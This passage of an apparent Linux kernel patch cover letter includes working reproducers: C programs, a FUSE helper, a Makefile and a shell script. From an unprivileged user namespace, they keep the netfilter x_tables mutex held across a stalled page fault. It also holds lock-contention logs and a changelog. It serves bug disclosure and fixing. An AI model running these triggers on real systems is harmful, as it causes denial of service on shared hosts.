+	mapping = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
+		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (mapping == MAP_FAILED)
+		die("mmap");
+
+	get = (struct arpt_get_entries *)(mapping + page_size - sizeof(*get));
+	memset(get, 0, sizeof(*get));
+	strncpy(get->name, table_name, sizeof(get->name) - 1);
+	get->size = table_size;
+
+	uffd = setup_userfaultfd(mapping + page_size, data_len);
+	(void)uffd;
+
+	fd = make_ipv4_sock();
+	len = sizeof(*get) + table_size;
+
+	fprintf(stderr,
+		"holder[%d]: calling ARPT_SO_GET_ENTRIES with %u-byte table and a missing output page\n",
+		getpid(), table_size);
+	fflush(stderr);
+
+	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, get, &len) == 0) {
+		fprintf(stderr,
+			"holder[%d]: GET_ENTRIES unexpectedly returned\n",
+			getpid());
+		exit(EXIT_FAILURE);
+	}
+
+	fprintf(stderr, "holder[%d]: unexpected errno=%d (%s)\n",
+		getpid(), errno, strerror(errno));
+	exit(EXIT_FAILURE);
+}
+
+static void block_on_xt_mutex(void)
+{
+	struct arpt_getinfo info;
+	socklen_t len = sizeof(info);
+	int fd = make_ipv4_sock();
+
+	memset(&info, 0, sizeof(info));
+	strncpy(info.name, table_name, sizeof(info.name) - 1);
+
+	fprintf(stderr,
+		"waiter[%d]: calling ARPT_SO_GET_INFO and should block on xt[NFPROTO_ARP].mutex\n",
+		getpid());
+	fflush(stderr);
+
+	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) == 0) {
+		fprintf(stderr, "waiter[%d]: GET_INFO unexpectedly returned\n",
+			getpid());
+		exit(EXIT_FAILURE);
+	}
+
+	fprintf(stderr, "waiter[%d]: unexpected errno=%d (%s)\n",
+		getpid(), errno, strerror(errno));
+	exit(EXIT_FAILURE);
+}
+
+static pid_t spawn_child(void (*fn)(unsigned int), unsigned int arg)
+{
+	pid_t pid = fork();
+
+	if (pid < 0)
+		die("fork");
+	if (pid == 0) {
+		prctl(PR_SET_PDEATHSIG, SIGKILL);
+		fn(arg);
+		_exit(EXIT_FAILURE);
+	}
+	return pid;
+}
+
+static pid_t spawn_waiter_child(void)
+{
+	pid_t pid = fork();
+
+	if (pid < 0)
+		die("fork");
+	if (pid == 0) {
+		prctl(PR_SET_PDEATHSIG, SIGKILL);
+		block_on_xt_mutex();
+		_exit(EXIT_FAILURE);
+	}
+	return pid;
+}
+
+static void dump_proc_state(pid_t pid, const char *tag)
+{
+	char path[64];
+	char buf[256];
+	int fd;
+	ssize_t n;
+
+	snprintf(path, sizeof(path), "/proc/%d/wchan", pid);
+	fd = open(path, O_RDONLY | O_CLOEXEC);
+	if (fd < 0)
+		return;
+	n = read(fd, buf, sizeof(buf) - 1);
+	close(fd);
+	if (n <= 0)
+		return;
+	buf[n] = '\0';
+	fprintf(stderr, "%s[%d]: wchan=%s\n", tag, pid, buf);
+}
+
+int main(void)
+{
+	unsigned int table_size;
+	pid_t holder;
+	pid_t waiter;
+	unsigned int i;
+
+	if (geteuid() != 0) {
+		fprintf(stderr, "run as root for the userfaultfd-based trigger path\n");
+		return EXIT_FAILURE;
+	}
+
+	table_size = fetch_table_size();
+	fprintf(stderr, "parent[%d]: table \"%s\" size=%u bytes\n",
+		getpid(), table_name, table_size);
+
+	holder = spawn_child(hang_in_get_entries, table_size);
+	sleep(1);
+	waiter = spawn_waiter_child();
+
+	fprintf(stderr,
+		"parent[%d]: holder=%d waiter=%d; dumping wchan while waiter should block\n",
+		getpid(), holder, waiter);
+	fflush(stderr);
+
+	for (i = 0; i < 30; i++) {
+		dump_proc_state(holder, "holder");
+		dump_proc_state(waiter, "waiter");
+		sleep(1);
+	}
+
+	fprintf(stderr, "parent[%d]: holder/waiter still stalled; mutex hold is the bug\n", getpid());
+	kill(holder, SIGKILL);
+	kill(waiter, SIGKILL);
+	waitpid(holder, NULL, 0);
+	waitpid(waiter, NULL, 0);
+	return EXIT_FAILURE;
+}
+------END poc.c------
+
+------BEGIN poc_userns_trigger.c------
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/netfilter_arp/arp_tables.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sched.h>
+#include <sys/prctl.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+#ifndef SOL_IP
+#define SOL_IP 0
+#endif
+
+static const char *table_name = "filter";
+
+static void die(const char *msg)
+{
+	perror(msg);
+	exit(EXIT_FAILURE);
+}
+
+static int make_ipv4_sock(void)
+{
+	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+	if (fd < 0)
+		die("socket(AF_INET, SOCK_DGRAM)");
+	return fd;
+}
+
+static unsigned int fetch_table_size(void)
+{
+	struct arpt_getinfo info;
+	socklen_t len = sizeof(info);
+	int fd = make_ipv4_sock();
+
+	memset(&info, 0, sizeof(info));
+	strncpy(info.name, table_name, sizeof(info.name) - 1);
+
+	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) < 0)
+		die("getsockopt(ARPT_SO_GET_INFO)");
+
+	close(fd);
+	return info.size;
+}
+
+static void hang_in_get_entries(unsigned int table_size, const char *path)
+{
+	size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
+	size_t map_len = page_size * 2;
+	char *mapping;
+	struct arpt_get_entries *get;
+	int backing_fd;
+	int sock;
+	socklen_t len;
+
+	mapping = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
+		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (mapping == MAP_FAILED)
+		die("mmap anonymous");
+
+	backing_fd = open(path, O_RDWR | O_CLOEXEC);
+	if (backing_fd < 0)
+		die("open fuse file");
+
+	if (mmap(mapping + page_size, page_size, PROT_READ | PROT_WRITE,
+		 MAP_PRIVATE | MAP_FIXED, backing_fd, 0) == MAP_FAILED)
+		die("mmap fuse page");
+	close(backing_fd);
+
+	get = (struct arpt_get_entries *)(mapping + page_size - sizeof(*get));
+	memset(get, 0, sizeof(*get));
+	strncpy(get->name, table_name, sizeof(get->name) - 1);
+	get->size = table_size;
+
+	sock = make_ipv4_sock();
+	len = sizeof(*get) + table_size;
+
+	fprintf(stderr,
+		"holder[%d]: namespace GET_ENTRIES using FUSE-backed output page\n",
+		getpid());
+	fflush(stderr);
+
+	if (getsockopt(sock, SOL_IP, ARPT_SO_GET_ENTRIES, get, &len) == 0) {
+		fprintf(stderr, "holder[%d]: GET_ENTRIES unexpectedly returned\n",
+			getpid());
+		exit(EXIT_FAILURE);
+	}
+
+	fprintf(stderr, "holder[%d]: unexpected errno=%d (%s)\n",
+		getpid(), errno, strerror(errno));
+	exit(EXIT_FAILURE);
+}
+
+static void block_on_xt_mutex(void)
+{
+	struct arpt_getinfo info;
+	socklen_t len = sizeof(info);
+	int sock = make_ipv4_sock();
+
+	memset(&info, 0, sizeof(info));
+	strncpy(info.name, table_name, sizeof(info.name) - 1);
+
+	fprintf(stderr,
+		"waiter[%d]: namespace GET_INFO expected to block on xt mutex\n",
+		getpid());
+	fflush(stderr);
+
+	if (getsockopt(sock, SOL_IP, ARPT_SO_GET_INFO, &info, &len) == 0) {
+		fprintf(stderr, "waiter[%d]: GET_INFO unexpectedly returned\n",
+			getpid());
+		exit(EXIT_FAILURE);
+	}
+
+	fprintf(stderr, "waiter[%d]: unexpected errno=%d (%s)\n",
+		getpid(), errno, strerror(errno));
+	exit(EXIT_FAILURE);
+}
+
+static void dump_netns(pid_t pid, const char *tag)
+{
+	char path[64];
+	char link[128];
+	ssize_t n;
+
+	snprintf(path, sizeof(path), "/proc/%d/ns/net", pid);
+	n = readlink(path, link, sizeof(link) - 1);
+	if (n <= 0)
+		return;
+	link[n] = '\0';
+	fprintf(stderr, "%s[%d]: netns=%s\n", tag, pid, link);
+}
+
+static void dump_wchan(pid_t pid, const char *tag)
+{
+	char path[64];
+	char buf[256];
+	int fd;
+	ssize_t n;
+
+	snprintf(path, sizeof(path), "/proc/%d/wchan", pid);
+	fd = open(path, O_RDONLY | O_CLOEXEC);
+	if (fd < 0)
+		return;
+	n = read(fd, buf, sizeof(buf) - 1);
+	close(fd);
+	if (n <= 0)
+		return;
+	buf[n] = '\0';
+	fprintf(stderr, "%s[%d]: wchan=%s\n", tag, pid, buf);
+}
+
+int main(int argc, char **argv)
+{
+	unsigned int table_size;
+	pid_t holder;
+	pid_t waiter;
+	unsigned int i;
+
+	if (argc != 2) {
+		fprintf(stderr, "usage: %s <fuse-file-path>\n", argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	if (geteuid() != 0) {
+		fprintf(stderr,
+			"run under unshare -Urn so the process has namespace-local CAP_NET_ADMIN\n");
+		return EXIT_FAILURE;
+	}
+
+	table_size = fetch_table_size();
+	dump_netns(getpid(), "parent");
+	fprintf(stderr, "parent[%d]: namespace table size=%u bytes\n",
+		getpid(), table_size);
+
+	holder = fork();
+	if (holder < 0)
+		die("fork");
+	if (holder == 0) {
+		prctl(PR_SET_PDEATHSIG, SIGKILL);
+		if (unshare(CLONE_NEWNET) < 0)
+			die("unshare(CLONE_NEWNET)");
+		table_size = fetch_table_size();
+		fprintf(stderr,
+			"holder[%d]: entered a separate network namespace\n",
+			getpid());
+		hang_in_get_entries(table_size, argv[1]);
+	}
+
+	sleep(1);
+
+	waiter = fork();
+	if (waiter < 0)
+		die("fork");
+	if (waiter == 0) {
+		prctl(PR_SET_PDEATHSIG, SIGKILL);
+		dump_netns(getpid(), "waiter");
+		block_on_xt_mutex();
+	}
+
+	fprintf(stderr,
+		"parent[%d]: holder=%d waiter=%d; dumping wchan while waiter should block\n",
+		getpid(), holder, waiter);
+	fflush(stderr);
+
+	for (i = 0; i < 30; i++) {
+		dump_netns(holder, "holder");
+		dump_netns(waiter, "waiter");
+		dump_wchan(holder, "holder");
+		dump_wchan(waiter, "waiter");
+		sleep(1);
+	}
+
+	kill(holder, SIGKILL);
+	kill(waiter, SIGKILL);
+	waitpid(holder, NULL, 0);
+	waitpid(waiter, NULL, 0);
+	return EXIT_FAILURE;
+}
+------END poc_userns_trigger.c------
+
+------BEGIN fuse_stall.c------
+#define FUSE_USE_VERSION 31
+
+#include <errno.h>
+#include <fuse3/fuse.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+static const char *file_name = "stall.bin";
+static const size_t file_size = 4096;
+
+static int stall_getattr(const char *path, struct stat *st,
+			 struct fuse_file_info *fi)
+{
+	(void)fi;
+	memset(st, 0, sizeof(*st));
+
+	if (strcmp(path, "/") == 0) {
+		st->st_mode = S_IFDIR | 0755;
+		st->st_nlink = 2;
+		return 0;
+	}
+
+	if (strcmp(path, "/stall.bin") == 0) {
+		st->st_mode = S_IFREG | 0666;
+		st->st_nlink = 1;
+		st->st_size = file_size;
+		return 0;
+	}
+
+	return -ENOENT;
+}
+
+static int stall_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
+			 off_t off, struct fuse_file_info *fi,
+			 enum fuse_readdir_flags flags)
+{
+	(void)off;
+	(void)fi;
+	(void)flags;
+
+	if (strcmp(path, "/") != 0)
+		return -ENOENT;
+
+	filler(buf, ".", NULL, 0, 0);
+	filler(buf, "..", NULL, 0, 0);
+	filler(buf, file_name, NULL, 0, 0);
+	return 0;
+}
+
+static int stall_open(const char *path, struct fuse_file_info *fi)
+{
+	(void)fi;
+
+	if (strcmp(path, "/stall.bin") != 0)
+		return -ENOENT;
+	return 0;
+}
+
+static int stall_read(const char *path, char *buf, size_t size, off_t off,
+		      struct fuse_file_info *fi)
+{
+	(void)buf;
+	(void)size;
+	(void)off;
+	(void)fi;
+
+	if (strcmp(path, "/stall.bin") != 0)
+		return -ENOENT;
+
+	fprintf(stderr,
+		"fuse[%d]: read request for stall.bin received; stalling indefinitely\n",
+		getpid());
+	fflush(stderr);
+
+	for (;;)
+		pause();
+}
+
+static const struct fuse_operations stall_ops = {
+	.getattr = stall_getattr,
+	.readdir = stall_readdir,
+	.open = stall_open,
+	.read = stall_read,
+};
+
+int main(int argc, char **argv)
+{
+	if (argc != 2) {
+		fprintf(stderr, "usage: %s <mountpoint>\n", argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	return fuse_main(argc, argv, &stall_ops, NULL);
+}
+------END fuse_stall.c------
+
+------BEGIN Makefile------
+CC ?= gcc
+CFLAGS ?= -O2 -Wall -Wextra
+PKG_CONFIG ?= pkg-config
+
+FUSE_AVAILABLE := $(shell $(PKG_CONFIG) --exists fuse3 && echo 1 || echo 0)
+FUSE_CFLAGS := $(shell $(PKG_CONFIG) --cflags fuse3 2>/dev/null)
+FUSE_LIBS := $(shell $(PKG_CONFIG) --libs fuse3 2>/dev/null)
+
+ifeq ($(FUSE_AVAILABLE),1)
+ALL_TARGETS := poc poc-userns-trig fuse_stall
+else
+ALL_TARGETS := poc poc-userns-trig
+endif
+
+.PHONY: all clean
+
+all: $(ALL_TARGETS)
+
+poc: poc.c
+	$(CC) $(CFLAGS) -o $@ $<
+
+poc-userns-trig: poc_userns_trigger.c
+	$(CC) $(CFLAGS) -o $@ $<
+
+fuse_stall: fuse_stall.c
+ifeq ($(FUSE_AVAILABLE),1)
+	$(CC) $(CFLAGS) $(FUSE_CFLAGS) -o $@ $< $(FUSE_LIBS)
+else
+	@echo "fuse3 headers not found; install libfuse3-dev in the guest to build fuse_stall" >&2
+	@exit 1
+endif
+
+clean:
+	rm -f poc poc-userns-trig fuse_stall
+------END Makefile------
+
+------BEGIN poc.sh------
+#!/bin/sh
+set -eu
+
+mnt="${1:-$HOME/fusemnt}"
+fuse_bin="${FUSE_BIN:-./fuse_stall}"
+trigger_bin="${TRIGGER_BIN:-./poc-userns-trig}"
+log_file="${FUSE_LOG:-$HOME/fuse_stall.log}"
+
+fusermount3 -u -q "$mnt" 2>/dev/null || true
+rm -rf "$mnt"
+mkdir -p "$mnt"
+
+"$fuse_bin" "$mnt" >"$log_file" 2>&1 &
+for _ in $(seq 1 50); do
+	if [ -e "$mnt/stall.bin" ]; then
+		exec unshare -Urn "$trigger_bin" "$mnt/stall.bin"
+	fi
+	sleep 0.2
+done
+
+echo "timed out waiting for $mnt/stall.bin" >&2
+exit 1
+------END poc.sh------
+
+Unpatched FUSE/user-namespace runtime observation. The holder is in a
+FUSE page fault; the waiter is blocked on the xt mutex. This is a
+lock-contention observation, not a crash log.
+
+The helper build completed with fuse_build_rc=0, and fuse_stall plus
+poc-userns-trig built successfully. The recorded fixed run kept the holder
+at folio_wait_bit_common while the GET_INFO waiter stayed at wchan=0 and
+returned success (getsockopt() == 0). An ordinary GET_INFO check reported
+name=filter, size=952, entries=4, and the collected dmesg tail had no Oops,
+BUG, WARNING or kernel panic. These observations are from the ARP run only.
+
+The following logs are real cross-network-namespace observations. The
+unpatched block records the lock contention; the v3 fixed block shows
+the holder waiting on FUSE while the GET_INFO waiter returns success.
+In this helper, "GET_INFO unexpectedly returned" is the success branch:
+getsockopt() returned 0, and the waiter was no longer blocked (wchan=0). The
+harness exits with POC_RC=1 after its 30-second observation loop
+deliberately kills both children; this is expected harness behavior,
+not a kernel failure. The FUSE run does not set hung_task_panic or a
+hung-task timeout; it uses the holder and waiter wchan values as its oracle.
+
+----BEGIN lock-contention observation----
+parent[540]: netns=net:[4026532177]
+parent[540]: namespace table size=952 bytes
+holder[550]: entered a separate network namespace
+holder[550]: namespace GET_ENTRIES using FUSE-backed output page
+parent[540]: holder=550 waiter=551; dumping wchan while waiter should block
+holder[550]: netns=net:[4026532247]
+waiter[551]: netns=net:[4026532177]
+holder[550]: wchan=folio_wait_bit_common
+waiter[551]: netns=net:[4026532177]
+waiter[551]: wchan=0
+waiter[551]: namespace GET_INFO expected to block on xt mutex
+holder[550]: netns=net:[4026532247]
+waiter[551]: netns=net:[4026532177]
+holder[550]: wchan=folio_wait_bit_common
+waiter[551]: wchan=xt_find_table_lock
+holder[550]: netns=net:[4026532247]
+waiter[551]: netns=net:[4026532177]
+holder[550]: wchan=folio_wait_bit_common
+waiter[551]: wchan=xt_find_table_lock
+holder[550]: netns=net:[4026532247]
+waiter[551]: netns=net:[4026532177]
+holder[550]: wchan=folio_wait_bit_common
+waiter[551]: wchan=xt_find_table_lock
+-----END lock-contention observation-----
+
+----BEGIN fixed v3 observation----
+parent[9799]: netns=net:[4026532713]
+parent[9799]: namespace table size=952 bytes
+holder[9832]: entered a separate network namespace
+parent[9799]: holder=9832 waiter=9855; dumping wchan while waiter should block
+holder[9832]: netns=net:[4026532868]
+waiter[9855]: netns=net:[4026532713]
+waiter[9855]: namespace GET_INFO expected to block on xt mutex
+waiter[9855]: GET_INFO unexpectedly returned
+holder[9832]: wchan=folio_wait_bit_common
+waiter[9855]: wchan=0
+holder[9832]: netns=net:[4026532868]
+holder[9832]: wchan=folio_wait_bit_common
+waiter[9855]: wchan=0
+POC_RC=1
+-----END fixed v3 observation-----
+
+----BEGIN crash log----
+NOT RUN: this v3 validation produced no kernel crash or stack trace. The
+FUSE run uses the lock-contention observations above instead; it does not
+enable hung_task_panic or a hung-task timeout.
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+changes in v3:
+  - Validate table and requested size before fault-in, then revalidate the
+    table and size after lock reacquisition in native and IPv4/IPv6 compat
+    GET_ENTRIES paths.
+  - Make retry semantics explicit: one initial nofault attempt followed by
+    at most three retries. Keep fault-in and retry decisions outside family
+    mutexes; failed fault-in and exhausted retries return -EFAULT.
+  - Keep the fixed-size GET_INFO copy outside table locks and brace compat
+    lookup error arms.
+  - Clarify ARP-only runtime coverage, privilege scope, helper build,
+    holder/waiter evidence, QEMU configuration, and the NOT RUN
+    crash-log status.
+  - Regenerate the numbered patch and cover with LF line endings; use the
+    standard 0001-*.patch filename.
+  - v2 Link:
+    https://lore.kernel.org/all/cover.1788961415.git.zihanx@nebusec.ai/
+changes in v2:
+  - Rebase onto current nf.git after 0bd7ed1a3263c
+    ("netfilter: arp_tables: remove the 32bit compat interface").
+    ARP GET_INFO and GET_ENTRIES use native paths only; IPv4 and IPv6
+    retain compat handling.
+  - Drop hung_task_panic and the 10-second hung_task timeout from the
+    reproducer, as pointed out by Pablo Neira Ayuso; observe holder/waiter
+    wchan instead.
+  - v1 Link:
+    https://lore.kernel.org/all/cover.1788244146.git.zihanx@nebusec.ai/
+
+---
+Zihan Xi (1):
+  netfilter: x_tables: avoid holding mutex over faultable user copies
+
+ net/ipv4/netfilter/arp_tables.c | 49 ++++++++++++++++---
+ net/ipv4/netfilter/ip_tables.c  | 87 +++++++++++++++++++++++++++++----
+ net/ipv6/netfilter/ip6_tables.c | 87 +++++++++++++++++++++++++++++----
+ 3 files changed, 197 insertions(+), 26 deletions(-)
+
+-- 
+2.55.0.windows.3
+
